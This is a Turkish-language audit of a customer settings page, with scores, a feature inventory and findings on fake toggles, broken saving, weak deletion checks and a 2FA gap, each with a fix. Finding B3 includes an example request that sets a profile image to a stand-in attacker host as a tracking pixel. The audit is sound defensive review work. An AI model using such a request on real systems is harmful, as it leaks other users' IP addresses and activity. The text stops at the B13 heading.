# /customer/settings

**Amaç:** Müşterinin hesap merkezi — profil (ad, avatar, doğum günü + yıllık bonus), bildirim tercihleri, güvenlik (2FA, şifre), uygulama tercihleri (dil, tema, gizlilik, erişilebilirlik), profil vitrini/çerçeve rengi ve KVKK (veri indirme, hesap silme). Tek dosya: `app/customer/settings/page.tsx` (1148 satır, `'use client'`), 6 sekme.

**Genel puan:** 4.3 / 10
**Karar:** **yeniden tasarla** — altyapının bir kısmı sağlam (2FA, doğum günü bonusunun atomik guard'ı, vitrin sahiplik doğrulaması, şifre rate-limit), ama sayfadaki anahtarların yaklaşık üçte biri **hiçbir şeyi kontrol etmiyor** (sahte), iki kontrol **bozuk**, bildirim modeli ikiye bölünmüş ve hesap silme/avatar yolunda güvenlik açıkları var. Kullanıcıya "ayarı değiştirdim" hissi verip arka planda hiçbir şey değişmemesi, bir ayarlar sayfası için en ağır güven kaybıdır.

---

## Puan kartı

| Boyut | Puan | Gerekçe |
|---|---|---|
| İşlevsellik | 4/10 | Profil/şifre/2FA/doğum günü/vitrin çalışıyor; ama tema, profili göster, liderlik tablosu ve eski bildirim kartındaki 4 anahtar sahte, "Kampanya" ve "Hatırlatma" grupları sunucuda uygulanmıyor, şifre kartı başlığı ham i18n anahtarı gösteriyor. |
| UX | 4/10 | Aynı konu için iki ayrı bildirim kartı ve 4 ayrı "Kaydet" butonu var; kaydedilmemiş değişiklik uyarısı yok; pencere odağı değişince yazılan ad siliniyor; doğum tarihi kilitli olduğu halde düzenlenebilir görünüyor. |
| Görsel | 5/10 | shadcn kart dili düzgün; ama "Vitrin" sekmesi sabit koyu renklerle (`bg-slate-950`, `text-white`) yazılmış, açık temada kopuyor; sayfa oyunlaştırma ürününün kimliğini hiç taşımıyor (düz form yığını). |
| Mimari | 3/10 | 1148 satırlık tek client bileşeni, 20+ `useState`, ortak `saving` bayrağı, kullanıcı başına ayarlar global `Settings` tablosunda, iki paralel bildirim tercih modeli, ölü kopya bileşen (`privacy-security.tsx`), iki toast sistemi. |
| Performans | 6/10 | Ağır değil; ama her oturum yenilemesinde/pencere odağında `/api/user/profile` (3 `_count` alt sorgusu) yalnızca `hasPassword` için yeniden çağrılıyor, `/api/birthday` sayfada iki kez çekiliyor, sekme değişiminde vitrin/2FA yeniden fetch ediliyor. |
| Erişilebilirlik + Mobil | 4/10 | Mobilde sekmeler yalnızca ikon ve erişilebilir adı yok; `Label`'lar input'lara bağlı değil; şifre alanlarında `autocomplete` yok; "Animasyonları azalt" framer-motion'u durdurmuyor; avatar hover butonu dokunmatik/klavyede görünmez. |

---

## Özellik envanteri

| # | Özellik | Durum | Kanıt | Not |
|---|---|---|---|---|
| 1 | Masaüstü sayfa başlığı | ÇALIŞIYOR | `page.tsx:504-507`, `components/dashboard/page-heading.tsx:20` | `hidden sm:flex` |
| 2 | Mobil başlık kartı | ÇALIŞIYOR | `page.tsx:510-513` | Diğer müşteri sayfalarıyla aynı desen |
| 3 | Sekme çubuğu (6 sekme) | KISMI | `page.tsx:515-541` | `<sm` ekranda metin `hidden` → sekmelerin erişilebilir adı yok, kullanıcı 6 anonim ikon görüyor |
| 4 | Avatar önizleme + baş harf fallback | ÇALIŞIYOR | `page.tsx:559-564` | |
| 5 | Avatar üzerindeki hover "kamera" butonu | KISMI | `page.tsx:567` | `opacity-0 group-hover` → dokunmatik ve klavye odağında görünmez, `aria-label` yok |
| 6 | Avatar dialogu — kategori seçimi | ÇALIŞIYOR | `page.tsx:580-592`, `443-445` | "Bayi" kategorisi doğru filtreleniyor |
| 7 | Avatar dialogu — ızgaradan seçim | ÇALIŞIYOR | `page.tsx:596-620`, `218-222` | Seçim yalnızca yerel; tüm görsellerin `alt="Avatar"`, `aria-pressed` yok |
| 8 | "Avatar Değiştir" butonu | ÇALIŞIYOR | `page.tsx:628-636` | |
| 9 | Ad Soyad alanı | KISMI | `page.tsx:648-654`, `87-109` | `useEffect([session])` her oturum yenilemesinde adı ve avatarı session'dan **ezer** (bkz. B5); `Label` bağlı değil |
| 10 | E-posta (salt okunur) + "destek ile iletişime geçin" | KISMI | `page.tsx:655-659` | Destek bağlantısı/aksiyonu yok; e-posta değiştirme akışı yok |
| 11 | Profil kaydet | KISMI | `page.tsx:224-247`, `app/api/user/profile/route.ts:11-24` | Çalışıyor ama sunucu `image`'ı allowlist'e karşı doğrulamıyor (B3); sunucunun zod hata mesajı gösterilmiyor (`page.tsx:240`) |
| 12 | Doğum günü — yükleniyor durumu | ÇALIŞIYOR | `page.tsx:676-677` | |
| 13 | Doğum günü bonusu "Talep et" | ÇALIŞIYOR | `page.tsx:278-296`, `app/api/birthday/route.ts:187-231` | Atomik `updateMany` guard + `points_credited` aynı tx'te — ekonomi kurallarına uygun |
| 14 | "Bu yıl zaten alındı" mesajı | ÇALIŞIYOR | `page.tsx:696-700` | |
| 15 | Yıllık bonus ipucu | ÇALIŞIYOR | `page.tsx:701-705` | |
| 16 | Doğum tarihi input + kaydet | KISMI | `page.tsx:706-719`, `birthday/route.ts:124-139` | Tarih bir kez kaydedilince kilitleniyor (409), ama UI düzenlenebilir kalıyor ve kullanıcı ancak hata alınca öğreniyor; ileri tarih kabul ediliyor; hata metinleri İngilizce (`route.ts:162,173,182`) |
| 17 | Bildirim Türleri matrisi (4 grup × app/e-posta/push) | KISMI | `page.tsx:735-809`, `lib/notification-prefs.ts:38-59` | Yalnızca `character`(app+email) ve `team`(app+push) gerçekten uygulanıyor; `campaign`, `reminder` hiçbir gönderim yolunda kontrol edilmiyor (B2) |
| 18 | "Tercihleri Kaydet" (tür matrisi) | ÇALIŞIYOR | `page.tsx:327-349`, `api/customer/settings/route.ts:219-237` | `User.notificationPrefs`'e birleştirerek yazıyor |
| 19 | Eski kart — "Rozet Kazandığımda" e-posta | ÇALIŞIYOR | `page.tsx:820-829`, `lib/notify-email.ts:31-43,140` | `emailBadge` gerçekten okunuyor |
| 20 | Eski kart — "Görev Tamamladığımda" e-posta | SAHTE | `page.tsx:830-839` | `emailQuest` repo genelinde hiçbir gönderici tarafından okunmuyor (grep) |
| 21 | Eski kart — "Yeni Ödüller" e-posta | SAHTE | `page.tsx:840-849` | `emailReward` hiçbir yerde okunmuyor |
| 22 | Eski kart — Push "Rozet Bildirimleri" | SAHTE | `page.tsx:856-865` | `pushBadge` hiçbir yerde okunmuyor |
| 23 | Eski kart — Push "Görev Bildirimleri" | SAHTE | `page.tsx:866-875` | `pushQuest` hiçbir yerde okunmuyor; `pushReward` state'te var ama UI'da yok (`page.tsx:117`) |
| 24 | Eski kart "Kaydet" | KISMI | `page.tsx:298-317`, `879-882` | Kaydediyor ama kaydettiği alanların 4/5'i etkisiz; `saving` bayrağı profil/şifre/tercihlerle ortak |
| 25 | "İşletme yanıtladığında e-posta" opt-out | EKSİK | `lib/notify-email.ts:122`, `api/customer/settings/route.ts:22` | Sunucu `emailReply`'ı okuyor, ama kullanıcı bunu kapatabileceği hiçbir yer yok |
| 26 | Push aboneliği / tarayıcı izni yönetimi | EKSİK | `hooks/use-push-notifications.ts:66-90` yalnızca kullanılmayan `components/settings/privacy-security.tsx:10`'dan import ediliyor | Push anahtarları var, ama kullanıcının push'a abone olabileceği canlı bir UI yok |
| 27 | 2FA kurulum (QR + secret + doğrula) | ÇALIŞIYOR | `components/auth/two-factor-settings.tsx:36-80` | |
| 28 | Kurtarma kodları göster/kopyala | ÇALIŞIYOR | `two-factor-settings.tsx:123-135` | İndirme/yeniden üretme yok |
| 29 | 2FA devre dışı bırak | KISMI | `two-factor-settings.tsx:82-102` | `window.prompt()` ile kod alıyor (PWA/WebView'da güvenilmez, stilsiz); Google girişi 2FA'yı atlıyor (B6) |
| 30 | Şifre kartı başlığı | BOZUK | `page.tsx:898`; `messages/tr.json` ve `en.json`'da `customerSettings` anahtarı yok; `i18n/request.ts:36` anahtarı aynen döndürüyor | Kullanıcı başlıkta **"customerSettings.passwordTitle"** görüyor |
| 31 | Şifre değiştir | ÇALIŞIYOR | `page.tsx:351-384`, `api/user/password/route.ts:22-69` | Rate-limit var; ama `<form>`/`autocomplete` yok, diğer oturumlar sonlandırılmıyor, güç göstergesi yok |
| 32 | İlk şifre oluştur (OAuth kullanıcı) | ÇALIŞIYOR | `page.tsx:386-415`, `api/user/initial-password/route.ts:43-54` | |
| 33 | Aktif oturumlar / cihazlar / "her yerden çıkış" | EKSİK | — | Revolut/Monzo standardı |
| 34 | Dil seçimi | KISMI | `page.tsx:964-977`, `428-432` | `setLocale` çalışıyor, ama sayfanın büyük kısmı sabit Türkçe (`page.tsx:505,553,649,739,813,908,958…`); invalidate edilen `['customer','settings-preferences','language']` sorgu anahtarı hiçbir yerde kullanılmıyor (ölü) |
| 35 | Tema seçimi | BOZUK | `page.tsx:980-995`; `api/customer/settings/route.ts:53` | `setTheme` hiç çağrılmıyor (sahte); "Sistem" seçilirse strict şema `theme: enum(['dark','light'])` isteği 400 ile reddediyor ve **dil/gizlilik/erişilebilirlik dahil tüm tercih kaydı** başarısız oluyor (B1) |
| 36 | "Profili Göster" | SAHTE | `page.tsx:1001-1010` | `showProfile` yalnızca bu sayfa ve ayar API'sinde geçiyor (grep) |
| 37 | "Liderlik Tablosunda Göster" | SAHTE | `page.tsx:1011-1020`; `app/api/leaderboard/route.ts` filtrelemiyor | Kullanıcı kendini gizlediğini sanıyor, adı/avatarı listede kalıyor (B2) |
| 38 | Yüksek kontrast | ÇALIŞIYOR | `components/settings/accessibility-toggles.tsx:36-41`, `app/globals.css:835-848` | |
| 39 | Animasyonları azalt | KISMI | `globals.css:825-832`; `components/providers.tsx:232` | Yalnızca CSS animasyon/transition'ları kısıyor; `MotionConfig reducedMotion="user"` yalnızca işletim sistemi tercihini dinliyor → framer-motion animasyonları sürüyor |
| 40 | Renk körü modu | ÇALIŞIYOR | `globals.css:851-875` | Kapsam sınırlı (birkaç Tailwind sınıfı) |
| 41 | "Tercihleri Kaydet" | KISMI | `page.tsx:417-441` | Tema "Sistem" iken bozuk (#35); erişilebilirlik anahtarları anında uygulanıyor ama Kaydet'e basılmazsa bir sonraki ziyarette DB değeriyle geri alınıyor (`page.tsx:171-180`) |
| 42 | Vitrin — yükleniyor | ÇALIŞIYOR | `showcase-selector.tsx:174-181` | |
| 43 | Çerçeve rengi canlı önizleme | ÇALIŞIYOR | `showcase-selector.tsx:226-241` | Yalnızca kuşanılmış çerçeve varsa |
| 44 | Çerçeve yoksa boş durum | KISMI | `showcase-selector.tsx:236-239` | "Dükkandan bir çerçeve kuşanın" diyor ama `/customer/shop` bağlantısı yok; 10px metin |
| 45 | Hue slider | ÇALIŞIYOR | `showcase-selector.tsx:250-257` | `aria-label`/`aria-valuetext` yok |
| 46 | Çerçeve rengini sıfırla | ÇALIŞIYOR | `showcase-selector.tsx:259-268` | |
| 47 | "Rengi Kaydet" | KISMI | `showcase-selector.tsx:125-145`, `api/customer/custom-color/route.ts:21-27` | Sunucu değeri hiç doğrulamıyor (sınırsız uzunlukta string); kaydetme sırasında loading/disabled yok |
| 48 | Vitrin 4 slot | ÇALIŞIYOR | `showcase-selector.tsx:303-350` | Mobilde `grid-cols-4` + 8-9px metin |
| 49 | Slot seçim dialogu (rozet/kozmetik) | ÇALIŞIYOR | `showcase-selector.tsx:354-460` | Dialog sabit koyu (`bg-slate-950/95 text-white`) |
| 50 | Slot temizle (X) | ÇALIŞIYOR | `showcase-selector.tsx:314-322` | 24px hedef, `aria-label` yok |
| 51 | "Vitrini Kaydet" | ÇALIŞIYOR | `api/customer/showcase/route.ts:68-120` | Sahiplik doğrulaması ve tek transaction var |
| 52 | Vitrin hata durumu | KISMI | `showcase-selector.tsx:86-89` | Yalnızca toast; ekran "boş envanter" gibi görünür, yeniden dene yok |
| 53 | Kişisel veri indirme (JSON) | KISMI | `page.tsx:451-477`, `api/user/data-export/route.ts:16-64` | Doğum günü, kozmetikler, puan hareketleri, bildirim tercihleri, ayarlar, tüketim değerlendirmeleri dahil değil; KVKK "tüm veriler" iddiasıyla çelişiyor (B8) |
| 54 | Hesap silme dialogu + onay | KISMI | `page.tsx:1114-1145`, `api/user/delete-account/route.ts:21-39` | Yeniden kimlik doğrulama yok, placeholder beklenen e-postayı gösteriyor, büyük/küçük harf duyarlı (B4) |
| 55 | Silme sonrası çıkış | ÇALIŞIYOR | `page.tsx:489-492` | |
| 56 | Sayfa ayarlarının yüklenme hatası | KISMI | `page.tsx:182-184` | Sessiz `console.error`; UI varsayılan "hepsi açık" değerleri gösterir ve Kaydet bunları DB'ye yazar (B7) |
| 57 | Geri bildirim toast'ları | KISMI | `lib/admin-toast.ts:15-19`; `page.tsx:50` | Müşteri "**Basarili:** Profil güncellendi" görüyor (ş/ı yok, admin tonu); vitrin bileşeni düz `sonner` kullanıyor → iki farklı stil |
| 58 | Sekmeye doğrudan bağlantı (`?tab=`) | EKSİK | `page.tsx:515` (`defaultValue="profile"`) | Doğum günü bildirimi "Ayarlar → Profil" diyor (`birthday/route.ts:68`) ama bildirimden sekmeye derin bağlantı mümkün değil |

**Durum özeti (58 özellik):** ÇALIŞIYOR 27 · KISMI 19 · BOZUK 2 · SAHTE 6 · EKSİK 4

---

## Bulgular

### B1 — Tema seçimi sahte; "Sistem" seçmek tüm tercih kaydını bozuyor
- **Önem:** yüksek · **Kategori:** işlevsellik / veri doğrulama
- **Kanıt:** `page.tsx:980-995` "Koyu/Açık/Sistem" sunuyor; `page.tsx:417-441` hiçbir zaman `setTheme` çağırmıyor; `app/api/customer/settings/route.ts:53` `theme: z.enum(['dark','light'])` ve `.strict()`; hata metni aynen toast'a basılıyor (`route.ts:168`, `page.tsx:434`). Gerçek tema `next-themes` ile `localStorage('qratex-theme')` üzerinden yönetiliyor (`components/providers.tsx:223-230`) ve başlıktaki tema anahtarı çalışıyor (`components/dashboard/header.tsx:106`).
- **Sorun:** (1) Tema değiştirmenin görünür hiçbir etkisi yok. (2) Sayfa varsayılanı `'dark'` (`page.tsx:136`), uygulamanınki `system`; seçici gerçeği yansıtmıyor. (3) "Sistem" seçilirse PATCH 400 döner ve dil, gizlilik ve erişilebilirlik dahil aynı gövdedeki **her şey** kaydedilmez; kullanıcı İngilizce bir zod mesajı görür ("Invalid enum value…").
- **Öneri:** Temanın tek kaynağı `next-themes` olsun. Ayarlar sayfasındaki seçici `useTheme()` ile bağlansın (anında uygula, ayrı Kaydet yok), sunucu tarafı şema `system`'i kabul etsin ve oturum açılışında `preferences.theme` → `setTheme` ile cihazlar arası senkronlansın. Tercihler PATCH'i alan bazında (her anahtar için ayrı, "autosave") gönderilsin ki tek geçersiz alan diğerlerini düşürmesin.
- **Efor:** S

### B2 — Gizlilik anahtarları ve bildirim anahtarlarının büyük kısmı hiçbir şeyi kontrol etmiyor
- **Önem:** yüksek · **Kategori:** sahte özellik / güven / KVKK
- **Kanıt:**
  - `showProfile`, `showLeaderboard`: repo genelinde yalnızca `app/customer/settings/page.tsx` ve `app/api/customer/settings/route.ts` içinde geçiyor (grep). `app/api/leaderboard/route.ts:26,242,286` filtre uygulamadan `image`/isim döndürüyor.
  - `emailQuest`, `emailReward`, `pushBadge`, `pushQuest`, `pushReward`: hiçbir gönderici okumuyor (grep). Yalnızca `emailBadge` ve `emailReply` okunuyor (`lib/notify-email.ts:122,140`).
  - Tür matrisi: `campaign` ve `reminder` grupları hiçbir gönderim yolunda kontrol edilmiyor. `app/api/dealer/campaigns/[id]/send/route.ts:107-118` doğrudan `notification.createMany` + `sendPushNotification`; `lib/customer-reminders.ts:38,66` doğrudan `notification.create`; `lib/surprise-badges.ts:256-265` (`kind: 'surprise-badge'` → `campaign` grubu) tercihe bakmadan yazıyor. `notifyRespectingPrefs` (`lib/notify-prefs-server.ts:50`) hiçbir yerden import edilmiyor. `character` grubunda push hiç gönderilmiyor (`lib/character-badges.ts:291-313`); `team` grubunda e-posta kanalı `lib/team-email.ts` içinde kontrol edilmiyor.
- **Sorun:** Kullanıcı "Liderlik tablosunda gösterme" diyor ama görünmeye devam ediyor; bu bir gizlilik vaadinin ihlali. Kampanya bildirimlerini kapatan kullanıcıya bayi kampanyaları push ve zil olarak gitmeye devam ediyor. Bu, KVKK/ETK açısından ticari ileti onayıyla ilgili bir risk.
- **Öneri:** (1) Tek bir **bildirim karar noktası** kur: `lib/notify.ts` → `notify({userId, kind, channels, payload})`. Bu fonksiyon `kindToGroup` + `isChannelEnabled`'ı uygulasın ve in-app, e-posta ve push'u tek yerden dağıtsın. Tüm `prisma.notification.create` ve `sendPushNotification` çağrıları (yaklaşık 50 dosya) buna taşınsın; bir ESLint `no-restricted-syntax` kuralı doğrudan çağrıyı engellesin. (2) Gizlilik bayrakları `User` üzerinde gerçek kolonlar olsun (`leaderboardVisible`, `profilePublic`), liderlik ve profil sorguları bu kolona göre filtrelesin (ya da kullanıcıyı "Gizli Oyuncu #1234" olarak anonimleştirsin, Duolingo'nun yaptığı gibi). (3) Uygulanmayan hiçbir anahtar UI'da kalmasın.
- **Efor:** L

### B3 — Profil `image` alanı keyfi URL kabul ediyor (diğer kullanıcılara takip pikseli veya uygunsuz görsel)
- **Önem:** yüksek · **Kategori:** güvenlik
- **Kanıt:** `app/api/user/profile/route.ts:13` `image: z.string().max(2048)`; `route.ts:47` doğrudan yazıyor. CSP `img-src 'self' data: https: blob:` (`proxy.ts:24`, `next.config.js:351`). Liderlik `image` döndürüyor (`app/api/leaderboard/route.ts:26`). İstemci yalnızca `avatarList`'ten seçtiriyor (`page.tsx:443`), ama sunucu bunu zorlamıyor.
- **Sorun:** Bir kullanıcı `PATCH /api/user/profile {"image":"https://attacker.tld/p.gif"}` gönderebilir. Liderlik tablosunu açan herkesin tarayıcısı bu adrese istek atar: IP ve zaman sızar, uygunsuz içerik gösterilebilir. Ayrıca `lib/auth.ts:274` istemcinin `update({image})` çağrısıyla JWT'deki `image`'ı doğrulamadan değiştirebilmesine izin veriyor. Aynı blok `points`/`level`'ı da istemciden kabul ediyor (`auth.ts:275-276`); bu şu an yalnızca görüntüyü etkiliyor (`app/api/surprise-box/[id]/open/route.ts:53` yalnızca yedek değer olarak kullanıyor), ama tehlikeli bir desen.
- **Öneri:** Sunucuda `image` için allowlist kullan: `defaultAvatars` kümesi + OAuth sağlayıcı alan adları (`lh3.googleusercontent.com`) + kendi R2 yükleme alan adın. Ayrıca `role`'e göre alan setini kısıtla (müşteri `businessName`/`holidayMode` gönderememeli, `route.ts:15-23`). `jwt` callback'inin `update` dalı `points`/`level`/`image`'ı istemciden değil DB'den yeniden okusun.
- **Efor:** S

### B4 — Hesap silme: yeniden kimlik doğrulama yok, onay alanı cevabı kendisi gösteriyor
- **Önem:** yüksek · **Kategori:** güvenlik / veri bütünlüğü
- **Kanıt:** `page.tsx:1126` `placeholder={profile.email}`; e-posta Profil sekmesinde zaten açıkça yazıyor (`page.tsx:627`). `api/user/delete-account/route.ts:28` yalnızca `user.email !== confirmEmail` (büyük/küçük harf duyarlı), şifre/2FA istemiyor, rate-limit yok; `route.ts:33-39` iki ayrı yazma transaction dışında; geri dönüş süresi veya e-posta bildirimi yok.
- **Sorun:** Açık bir oturuma erişen herkes (paylaşılan cihaz, açık bırakılmış tablet, oturum çalınması) birkaç saniyede hesabı, puanları, rozetleri ve ödülleri kalıcı olarak silebilir. 2FA'yı açmış kullanıcının bile koruması yok. Büyük harfle kayıtlı e-posta kullanıcıyı haksız yere reddeder.
- **Öneri:** Silmeyi bir "hassas işlem" akışına bağla: şifresi olan kullanıcıdan şifre, 2FA'lı kullanıcıdan TOTP, OAuth kullanıcıdan e-postaya gönderilen tek kullanımlık kod iste. 14-30 gün **soft-delete** uygula (`User.deletionRequestedAt`; o sürede giriş yapınca iptal edilebilsin, sonra cron ile anonimleştirilsin), e-posta ile bilgi ver, `prisma.$transaction` kullan, e-postayı `toLowerCase()` ile karşılaştır ve placeholder'ı kaldır. Silmeden önce "kaybedeceklerin: X puan, Y rozet, Z ödül" özeti göster (Starbucks/Duolingo bunu yapıyor).
- **Efor:** M

### B5 — Pencere odağı değişince yazılan ad/avatar siliniyor
- **Önem:** orta · **Kategori:** hata / yarış koşulu
- **Kanıt:** `page.tsx:87-109` `useEffect(..., [session])` her çalıştığında `name/email/avatar`'ı session'dan **üzerine yazıyor**; `components/providers.tsx:220` `SessionProvider refetchInterval={5*60} refetchOnWindowFocus`.
- **Sorun:** Kullanıcı yeni adını yazıp başka sekmeye geçip döndüğünde (ya da 5 dakika beklediğinde) session yenilenir ve kaydedilmemiş ad ile seçilen avatar sessizce geri alınır. Aynı effect her seferinde `/api/user/profile`'ı yeniden çağırıyor; bu uç `points`, `level` ve 3 `_count` alt sorgusu döndürüyor (`profile/route.ts:108-137`), sayfa ise yalnızca `hasPassword`'u kullanıyor.
- **Öneri:** Profil formunu React Query + `react-hook-form` ile kur. Sunucu verisini `useQuery(['me','profile'])` ile bir kez al, form `defaultValues`'unu yalnızca ilk yüklemede ve `isDirty === false` iken senkronla. `hasPassword`'ü session token'a ya da hafif bir `/api/user/security-summary` ucuna taşı.
- **Efor:** S

### B6 — 2FA, Google ile girişte uygulanmıyor ve kullanıcıya bu söylenmiyor
- **Önem:** orta · **Kategori:** güvenlik / beklenti yönetimi
- **Kanıt:** TOTP kontrolü yalnızca credentials `authorize` içinde (`lib/auth.ts:182-183`); `signIn` callback OAuth için koşulsuz `true` (`lib/auth.ts:303-307`). 2FA kartı genel bir "hesabınıza ek güvenlik" vaadi veriyor (`two-factor-settings.tsx:117-119`). Devre dışı bırakma `window.prompt` ile yapılıyor (`two-factor-settings.tsx:83`).
- **Sorun:** Hem şifresi hem Google bağlantısı olan bir kullanıcı 2FA'yı açtığında Google yolundan TOTP sorulmadan girilebilir. Kullanıcı korunduğunu sanıyor.
- **Öneri:** Ya OAuth girişinden sonra da 2FA'lı hesaplar için ara bir "TOTP doğrula" adımı ekle (JWT'ye `mfaPending` bayrağı koy, proxy'de doğrulanana kadar `/auth/2fa`'ya yönlendir), ya da kartta açıkça "yalnızca e-posta+şifre girişi için" yaz. `prompt()` yerine shadcn `AlertDialog` + OTP input kullan. Kurtarma kodları için "indir (.txt)" ve "yeniden üret" ekle.
- **Efor:** M

### B7 — Ayarlar yüklenemezse varsayılanlar kullanıcının gerçek tercihlerinin üzerine yazılır
- **Önem:** orta · **Kategori:** veri bütünlüğü / hata yönetimi
- **Kanıt:** `page.tsx:158-187` hata durumunda yalnızca `console.error`; state varsayılanları "hepsi açık" (`page.tsx:111-125`, `134-142`); Kaydet tüm nesneyi gönderiyor (`page.tsx:304`, `333`, `423`). `api/customer/settings/route.ts:173-207` read-merge-write transaction dışında (eşzamanlı kayıtlarda kayıp güncelleme olabilir).
- **Sorun:** Ağ ya da Neon geçici olarak hata verirse kullanıcı yanlış (varsayılan) değerleri görür; birini değiştirip kaydettiğinde daha önce kapattığı tüm bildirimler yeniden açılır.
- **Öneri:** Yükleme hatasında formu kilitle ve "Yeniden dene" boş durumu göster (skeleton → error → ready üç durumlu). Kayıtlarda yalnızca **değişen alanları** (diff) gönder. Sunucuda JSON birleştirmeyi `$transaction` + `updatedAt` ile iyimser kilitle (ya da kullanıcı ayarlarını `UserSettings` tablosunda gerçek kolonlara taşı, bkz. B10).
- **Efor:** M

### B8 — KVKK veri indirme eksik; "tüm kişisel veriler" iddiası karşılanmıyor
- **Önem:** orta · **Kategori:** uyum / KVKK
- **Kanıt:** `api/user/data-export/route.ts:16-64` yalnızca profil, feedback (500), rozet, ödül, bildirim (200), analytics (200) döndürüyor. Doğum tarihi (`UserBirthday`), kozmetikler (`UserCosmetic`), `customFrameColor`, `notificationPrefs`, `Settings.user_settings_*`, tüketim değerlendirmeleri, puan hareketleri ve oyun kayıtları yok; sabit `take` sınırları var; rate-limit yok. İstemcide `URL.revokeObjectURL` click'ten hemen sonra çağrılıyor (`page.tsx:469-470`), bu bazı tarayıcılarda indirmeyi iptal edebilir.
- **Sorun:** KVKK m.11 erişim hakkı eksik karşılanıyor; çıktı kesilmiş olabilir ve kullanıcıya bundan söz edilmiyor.
- **Öneri:** Export'u kullanıcıya bağlı tüm modelleri kapsayan bir "veri haritası" (`lib/privacy/data-map.ts`) üzerinden üret. Büyük hesaplar için arka planda (Inngest) ZIP üret, R2'ye koy ve süreli bağlantıyı e-postayla gönder. İstek başına günde 1 limit koy, revoke'u `setTimeout` ile geciktir.
- **Efor:** M

### B9 — Şifre kartı başlığı ham i18n anahtarı gösteriyor
- **Önem:** orta · **Kategori:** hata / i18n
- **Kanıt:** `page.tsx:898` `tClient('customerSettings.passwordTitle', …)`; `messages/tr.json` ve `en.json` içinde `customerSettings` kökü yok (node ile doğrulandı); `i18n/request.ts:36` bulunamayan anahtarı aynen döndürüyor.
- **Sorun:** Güvenlik sekmesindeki ana kartın başlığı "customerSettings.passwordTitle". Bu, ürünün en güven gerektiren bölümünde yarım kalmış izlenimi veriyor.
- **Öneri:** Anahtarı iki dile ekle ve CI'da `t()` çağrılarını sözlüğe karşı tarayan bir kontrol koy (eksik anahtar varsa derleme düşsün).
- **Efor:** S

### B10 — Mimari: kullanıcı başına ayarlar global yapılandırma tablosunda, iki paralel bildirim modeli, ölü kopya bileşen
- **Önem:** orta · **Kategori:** mimari
- **Kanıt:** `Settings` modeli global key/value (`prisma/schema.prisma:899-907`) ve `user_settings_<id>` satırları `category: 'user'` ile oraya yazılıyor (`route.ts:197-207`). Admin listesi kategori verilmezse `take: 5000` ile bunları da çekiyor (`app/api/admin/settings/route.ts:61-66`); kullanıcı sayısı büyüdükçe admin ayar ekranı şişer ve kesilir. Bildirimler hem `Settings.notifications` (eski) hem `User.notificationPrefs` (yeni) içinde tutuluyor ve UI ikisini ayrı kartlarda gösteriyor (`page.tsx:735` ve `811`). `components/settings/privacy-security.tsx` (349 satır, i18n'li 2FA, push, export, silme) hiçbir yerden import edilmiyor. Sayfa 1148 satırlık tek bir client bileşeni, `saving` bayrağı 4 farklı formda ortak (`page.tsx:76`), birçok `any` (`showcase-selector.tsx:57,72-76`).
- **Öneri:** `UserPreferences` adında 1-1 bir tablo (ya da `User` üzerinde tipli kolonlar) aç: `locale`, `theme`, `leaderboardVisible`, `profilePublic`, `a11y*`, `notificationPrefs`. Eski `Settings.notifications` alanlarını tek seferlik bir migration ile `notificationPrefs` gruplarına eşle (`emailBadge` → yeni `badge` grubu, `emailReply` → yeni `feedback` grubu) ve eski kartı kaldır. Sayfayı sekme başına dosyalara böl (`settings/_sections/profile.tsx` …), veri katmanını React Query hook'larına (`useMyPreferences`, `useUpdatePreferences`) taşı, ölü bileşeni sil.
- **Efor:** L

### B11 — Doğum günü kilidi UI'da görünmüyor; bonus aynı gün ayarlanıp alınabiliyor
- **Önem:** orta · **Kategori:** UX / puan ekonomisi
- **Kanıt:** `birthday/route.ts:124-139` tarih bir kez ayarlanınca 409 dönüyor, ama `page.tsx:706-719` input ve Kaydet'i her durumda aktif gösteriyor. Uyarı yalnızca başarı mesajında var (`route.ts:150`). İleri ve uç tarihler doğrulanmıyor (`route.ts:116`). Tarih bugüne ayarlanırsa bonus hemen talep edilebiliyor (`route.ts:168-231`). İngilizce hata metinleri kullanıcıya toast olarak gidiyor (`route.ts:162,173,182`). GET isteği yan etki olarak bildirim yaratıyor (`route.ts:62-73`) ve sayfada iki kez çağrılıyor (layout'taki `customer-birthday-bonus-host.tsx:36` + `page.tsx:193`).
- **Sorun:** Kullanıcı tarihi düzeltmeye çalışınca hata alıyor. Ayrıca yeni açılan bir hesap tarihi "bugün" girip bonusu anında alabiliyor; bu çoklu hesapla puan basma yolu (bkz. puan ekonomisi kuralları).
- **Öneri:** Tarih kayıtlıysa kartı salt okunur "🎂 12 Mart · değiştirmek için destek" görünümüne çevir. İlk kayıtta onay modalı göster ("bir kez ayarlanır"). Starbucks benzeri bir **bekleme süresi** ekle: kayıttan en az 30 gün sonra gelen doğum günü bonusa uygun olsun (`createdAt` kontrolü sunucuda). `min`/`max` (13-110 yaş) sınırlarını hem input'a hem sunucuya koy. Hata kodlarını i18n'e bağla, GET'teki yazmayı ayrı bir POST/cron'a taşı.
- **Efor:** S

### B12 — Erişilebilirlik ve mobil eksikleri
- **Önem:** orta · **Kategori:** erişilebilirlik / mobil
- **Kanıt:** Sekme etiketleri `<sm`'de `hidden` (`page.tsx:519-540`), `aria-label` yok. `Label`'lar `htmlFor` olmadan (`page.tsx:649,656,908,918,925,964,980`). Şifre input'larında `autoComplete` yok ve `<form>` yok (Enter ile gönderilmiyor) (`page.tsx:909-931`). Avatar hover butonu (`page.tsx:567`), slot temizle (`showcase-selector.tsx:314`) ve hue slider (`:250`) erişilebilir ad taşımıyor. "Animasyonları azalt" framer-motion'a bağlı değil (`providers.tsx:232`). Vitrin bileşeni açık temada sabit koyu (`showcase-selector.tsx:217,281,362`). Mobil vitrinde 8-9px metin var (`:341,345,410`).
- **Öneri:** Mobilde sekmeleri yatay kaydırılabilir, etiketli "chip" satırına ya da (daha iyisi) iOS tarzı liste → alt sayfa navigasyonuna çevir. Tüm alanlara `id`/`htmlFor` ver, şifre alanlarına `autocomplete="current-password"`/`"new-password"` ekle. `MotionConfig`'in `reducedMotion` değerini `html.reduce-animations` sınıfından türet (`reducedMotion={a11y.reduceAnimations ? 'always' : 'user'}`). Vitrindeki sabit renkleri tema token'larına (`bg-card`, `text-foreground`) çevir.
- **Efor:** M

### B13 — Toast dili ve tonu tutarsız
- **Önem:** düşük · **Kategori:** UX / dil
